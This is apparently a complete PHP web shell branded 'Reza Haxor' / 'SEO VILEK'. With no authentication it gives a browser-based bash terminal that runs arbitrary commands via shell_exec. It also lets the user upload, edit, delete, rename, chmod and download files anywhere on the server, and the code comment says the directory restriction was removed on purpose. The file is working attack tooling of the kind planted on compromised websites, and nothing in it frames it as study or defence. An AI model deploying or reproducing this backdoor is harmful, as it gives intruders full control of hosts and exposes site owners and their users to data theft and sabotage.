<?php
session_start();

// Tidak lagi dibatasi ke __DIR__
$currentDir = isset($_GET['dir']) ? realpath($_GET['dir']) : getcwd();

// Handler tambahan: download, chmod, rename, info
if (isset($_GET['download'])) {
    $file = $_GET['download'];
    if (is_file($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename=' . basename($file));
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    }
}
if (isset($_POST['chmod_target']) && isset($_POST['chmod_value'])) {
    $target = $currentDir . '/' . $_POST['chmod_target'];
    $mode = intval($_POST['chmod_value'], 8);
    chmod($target, $mode);
    echo "<p>Permission changed.</p>";
}
if (isset($_POST['rename']) && isset($_POST['new_name'])) {
    $oldPath = $currentDir . '/' . $_POST['rename'];
    $newPath = $currentDir . '/' . $_POST['new_name'];
    if (file_exists($oldPath)) {
        rename($oldPath, $newPath);
        echo "<p>Renamed successfully.</p>";
    }
}
if (isset($_POST['stat'])) {
    $target = $currentDir . '/' . $_POST['stat'];
    $stat = stat($target);
    echo "<pre>File Info:\n" . print_r($stat, true) . "</pre>";
}

if ($currentDir === false) {
    $currentDir = getcwd();
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Reza Haxor</title>
    <meta charset="UTF-8">
    <style>
    body {
        font-family: monospace;
        background: #111;
        color: white;
        padding: 20px;
    }
    a {
        color: #ff00c8;
        text-decoration: none;
    }
    a:hover {
        text-decoration: underline;
    }
    .terminal, .file-editor {
        background: #b31b94;
        border: 1px solid white;
        padding: 10px;
        margin-top: 20px;
        white-space: pre-wrap;
        overflow-y: auto;
    }
    input, textarea, button {
        background: #111;
        color: white;
        border: 1px solid white;
        padding: 5px;
        font-family: monospace;
    }
    table {
        width: 100%;
        margin-top: 20px;
        border-collapse: collapse;
    }
    th, td {
        border: 1px solid white;
        padding: 5px;
    }
    </style>
</head>
<body>
<h2>SEO VILEK</h2>

<!-- Terminal -->
<form method="post">
    <input type="text" name="cmd" placeholder="Enter command">
    <input type="hidden" name="dir" value="<?= htmlspecialchars($currentDir) ?>">
    <button type="submit">Run</button>
</form>
<div class="terminal">
<?php
if (!empty($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    echo "<b>$ $cmd</b><br>";
    chdir($currentDir);
    $output = shell_exec("/bin/bash -c " . escapeshellarg($cmd));
    echo '<pre>' . htmlspecialchars($output) . '</pre>';
}
?>
</div>

<hr>
<h3>Upload File</h3>
<form method="post" enctype="multipart/form-data">
    <input type="file" name="file">
    <input type="hidden" name="dir" value="<?= htmlspecialchars($currentDir) ?>">
    <button type="submit" name="upload">Upload</button>
</form>
<?php
if (isset($_POST['upload']) && isset($_FILES['file'])) {
    $target = $currentDir . '/' . basename($_FILES['file']['name']);
    if (move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
        echo "<p>Uploaded successfully.</p>";
    } else {
        echo "<p>Upload failed.</p>";
    }
}
?>

<hr>
<h3>Create File / Folder</h3>
<form method="post">
    <input type="text" name="name" placeholder="Name">
    <input type="hidden" name="dir" value="<?= htmlspecialchars($currentDir) ?>">
    <button type="submit" name="create_file">Create File</button>
    <button type="submit" name="create_dir">Create Folder</button>
</form>
<?php
if (isset($_POST['create_file'])) {
    $path = $currentDir . '/' . $_POST['name'];
    if (!file_exists($path)) {
        file_put_contents($path, '');
        echo "<p>File created.</p>";
    }
}
if (isset($_POST['create_dir'])) {
    $path = $currentDir . '/' . $_POST['name'];
    if (!file_exists($path)) {
        mkdir($path);
        echo "<p>Folder created.</p>";
    }
}
?>

<!-- Directory Shortcuts -->
<hr>
<h3>Directory: <?= htmlspecialchars($currentDir) ?></h3>
<p>
    <?php
    $home = getenv("HOME");
    echo '<a href="?dir=' . urlencode($home) . '"><button>🏠 Home (~)</button></a> ';
    echo '<a href="?dir=' . urlencode($home . "/public_html") . '"><button>🌐 public_html</button></a> ';

    $subdomainDir = $home . "/public_html/subdomain";
    if (is_dir($subdomainDir)) {
        echo '<a href="?dir=' . urlencode($subdomainDir) . '"><button>📂 Subdomain</button></a>';
    }
    ?>
</p>

<?php
$parentDir = dirname($currentDir);
if ($parentDir !== $currentDir) {
    echo '<p><a href="?dir=' . urlencode($parentDir) . '"><button>⬅️ Parent Directory</button></a></p>';
}
?>
<table>
<tr><th>Name</th><th>Size</th><th>Modified</th><th>Actions</th></tr>
<?php
$items = scandir($currentDir);
foreach ($items as $item) {
    if ($item === '.' || $item === '..') continue;
    $path = $currentDir . '/' . $item;
    $encodedPath = urlencode($path);
    echo '<tr>';
    echo '<td>';
    if (is_dir($path)) {
        echo '📁 <a href="?dir=' . $encodedPath . '">' . htmlspecialchars($item) . '</a>';
    } else {
        echo '📄 ' . htmlspecialchars($item);
    }
    echo '</td>';
    echo '<td>' . (is_file($path) ? filesize($path) . ' bytes' : '-') . '</td>';
    echo '<td>' . date("Y-m-d H:i:s", filemtime($path)) . '</td>';
    echo '<td>
            
<form method="post" style="display:inline;">
    <input type="hidden" name="edit" value="' . htmlspecialchars($item) . '">
    <input type="hidden" name="dir" value="' . htmlspecialchars($currentDir) . '">
    <button type="submit">Edit</button>
</form>
<form method="post" style="display:inline;">
    <input type="hidden" name="delete" value="' . htmlspecialchars($item) . '">
    <input type="hidden" name="dir" value="' . htmlspecialchars($currentDir) . '">
    <button type="submit">Delete</button>
</form>
<form method="post" style="display:inline;">
    <input type="hidden" name="rename" value="' . htmlspecialchars($item) . '">
    <input type="hidden" name="dir" value="' . htmlspecialchars($currentDir) . '">
    <input type="text" name="new_name" placeholder="Rename" style="width:80px;">
    <button type="submit">Rename</button>
</form>
<form method="post" style="display:inline;">
    <input type="hidden" name="chmod_target" value="' . htmlspecialchars($item) . '">
    <input type="hidden" name="dir" value="' . htmlspecialchars($currentDir) . '">
    <input type="text" name="chmod_value" placeholder="755" style="width:50px;">
    <button type="submit">CHMOD</button>
</form>
<form method="post" style="display:inline;">
    <input type="hidden" name="stat" value="' . htmlspecialchars($item) . '">
    <input type="hidden" name="dir" value="' . htmlspecialchars($currentDir) . '">
    <button type="submit">Info</button>
</form>
<?php if (is_file($path)): ?>
<a href="?download=<?= urlencode($path) ?>"><button>Download</button></a>
<?php endif; ?>

        </td>';
    echo '</tr>';
}
?>
</table>

<?php
if (isset($_POST['delete'])) {
    $target = $currentDir . '/' . $_POST['delete'];
    if (is_dir($target)) {
        rmdir($target);
    } else {
        unlink($target);
    }
    echo "<p>Deleted successfully.</p>";
    echo "<meta http-equiv='refresh' content='0;url=?dir=" . urlencode($currentDir) . "'>";
}

if (isset($_POST['edit'])) {
    $file = $currentDir . '/' . $_POST['edit'];
    if (is_file($file)) {
        $content = htmlspecialchars(file_get_contents($file));
        echo "<hr><h3>Editing: " . htmlspecialchars($_POST['edit']) . "</h3>";
        echo '<form method="post">
                <textarea name="file_content" rows="10" cols="80">' . $content . '</textarea>
                <input type="hidden" name="save_file" value="' . htmlspecialchars($_POST['edit']) . '">
                <input type="hidden" name="dir" value="' . htmlspecialchars($currentDir) . '">
                <br><button type="submit">Save</button>
              </form>';
    }
}

if (isset($_POST['save_file'])) {
    file_put_contents($currentDir . '/' . $_POST['save_file'], $_POST['file_content']);
    echo "<p>File saved.</p>";
}
?>
</body>
</html>
